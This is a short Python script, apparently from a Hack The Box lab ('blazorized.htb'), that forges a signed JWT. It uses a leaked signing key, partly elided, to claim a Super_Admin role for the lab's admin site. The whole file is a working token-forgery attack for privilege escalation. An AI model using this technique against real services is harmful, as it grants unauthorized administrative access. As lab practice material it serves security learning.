import jwt
import time

current_time = int(time.time())
expiration_time = current_time + 3600 # 1 hour 

key = "86978544dd4...<SNIP>...12b26c3f574a1912ef1fcc2e77a28b53d0a"
issuer = "http://api.blazorized.htb"
audience = "http://admin.blazorized.htb"

email = "superadmin@blazorized.htb"
role = "Super_Admin"


payload = {
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": email,
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": role,
    "iss": issuer,
    "aud": audience,
    "exp": expiration_time,
    "iat": current_time
}

token = jwt.encode(payload, key, algorithm="HS512")

print(token)
